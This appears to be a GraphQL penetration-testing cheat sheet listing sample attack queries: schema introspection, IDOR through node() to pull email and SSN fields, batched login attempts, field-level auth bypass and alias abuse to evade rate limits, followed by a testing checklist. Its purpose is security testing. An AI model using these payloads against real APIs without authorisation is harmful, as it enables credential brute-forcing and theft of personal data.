# GraphQL-Specific

## Introspection (Alone = Informational, But Reveals Attack Surface)
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

## IDOR via node() (Bypasses Per-Object Auth)
```graphql
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

## Batching Attack (Rate Limit Bypass)
```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"}
]
```

## Field-Level Auth Bypass
```graphql
# REST /api/users/123 protected, but:
query { user(id: 123) { email ssn } }  # GraphQL resolver missing auth
```

## Alias Abuse (Rate Limit Bypass on Fields)
```graphql
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  # ... 100+ aliases in one request
}
```

## Testing Checklist
```
[ ] Introspection enabled?
[ ] node(id:) bypasses REST auth?
[ ] Batch queries accepted?
[ ] Field-level auth missing?
[ ] Alias abuse for rate limit bypass?
[ ] Mutations accept extra fields (mass assignment)?
[ ] Cost analysis / depth limiting missing? (DoS)
[ ] Directive @skip/@include abuse?
```